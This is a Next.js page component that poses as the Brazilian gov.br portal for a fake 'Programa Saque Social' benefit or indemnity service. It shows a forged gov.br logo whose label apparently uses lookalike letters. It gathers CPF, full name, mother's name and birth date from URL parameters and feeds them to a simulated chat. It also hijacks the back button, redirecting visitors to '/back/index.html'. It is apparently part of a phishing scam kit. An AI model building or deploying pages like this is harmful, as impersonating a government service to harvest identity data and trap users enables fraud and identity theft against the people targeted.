
"use client";

import React, { useState, useEffect, Suspense, useRef } from 'react';
import Head from 'next/head';
import Image from 'next/image';
import { useSearchParams, useRouter } from 'next/navigation';
import { MoreVertical, Cookie, LayoutGrid, User, Menu, Search } from 'lucide-react';
import SimulatedChatFlow, { type SimulatedChatParams } from '@/components/features/SimulatedChatFlow';
import '../chat-page.css';

function ChatPageContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [headerUserName, setHeaderUserName] = useState('Usuário');

  const [chatParams, setChatParams] = useState<SimulatedChatParams>({});

  useEffect(() => {
    const urlBackRedirect = '/back/index.html';
    const currentQuery = searchParams.toString();
    const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + currentQuery;

    if (window.history.state?.pageInitialized !== true) {
      history.pushState({ pageInitialized: true }, "", window.location.href);
    }

    const handlePopState = () => {
      setTimeout(() => {
        window.location.href = trimmedUrlBackRedirect;
      }, 1);
    };
    window.addEventListener('popstate', handlePopState);

    const nomeParam = searchParams.get('nome');
    if (nomeParam) {
      setHeaderUserName(nomeParam.split(' ')[0] || 'Usuário');
    }

    // Prepare params for SimulatedChatFlow
    const params: SimulatedChatParams = {};
    const gclid = searchParams.get('gclid');
    const utm_source = searchParams.get('utm_source');
    const utm_campaign = searchParams.get('utm_campaign');
    const utm_medium = searchParams.get('utm_medium');
    const utm_content = searchParams.get('utm_content');
    const cpf = searchParams.get('cpf');
    const nome = searchParams.get('nome');
    const mae = searchParams.get('mae');
    const nascimento = searchParams.get('nascimento');

    if (gclid) params.gclid = gclid;
    if (utm_source) params.utm_source = utm_source;
    if (utm_campaign) params.utm_campaign = utm_campaign;
    if (utm_medium) params.utm_medium = utm_medium;
    if (utm_content) params.utm_content = utm_content;
    if (cpf) params.cpf = cpf;
    if (nome) params.nome = nome;
    if (mae) params.mae = mae;
    if (nascimento) params.nascimento = nascimento;
    setChatParams(params);


    return () => {
      window.removeEventListener('popstate', handlePopState);
    };
  }, [searchParams]); // Ensure it re-runs if searchParams change, though unlikely in this setup after initial load.

  return (
    <>
      <Head>
        <title>Programa Saque Social - Atendimento</title>
      </Head>

      <div className="chat-page-body">
        <header className="chat-page-header">
          <div className="logo">
            <svg width="148" height="45" viewBox="0 0 148 45" aria-label="GОV.ВR">
              <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
                <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
                <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
              </text>
            </svg>
          </div>
          <div className="icons">
            <button title="Opções"><MoreVertical /></button>
            <button title="Cookies"><Cookie /></button>
            <button title="Menu de Apps"><LayoutGrid /></button>
            <button className="user">
              <User />
              <span>{headerUserName}</span>
            </button>
          </div>
        </header>

        <nav className="chat-page-nav">
          <button>
            <Menu />
            <p>Benefício <span> &gt; </span> Indenização <span> &gt; </span> Atendimento</p>
          </button>
          <button title="Buscar"><Search /></button>
        </nav>

        <div className="typebot-container-wrapper">
          <div className="typebot-embed-container">
            {/* Render the simulated chat flow here */}
            <SimulatedChatFlow initialParams={chatParams} />
          </div>
        </div>

        <footer className="chat-page-footer">
          <Image
            src="https://i.imgur.com/919uhHG.png"
            alt="Rodapé Logo"
            width={150}
            height={40}
            className="footer-logo"
            data-ai-hint="company logo"
            priority={false}
          />
        </footer>
      </div>
    </>
  );
}

export default function ChatPage() {
  return (
    <Suspense fallback={
      <div id="loading-screen" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff' }}>
        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45">
          <title>GОV.ВR</title>
          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
          </text>
        </svg>
      </div>
    }>
      <ChatPageContent />
    </Suspense>
  );
}
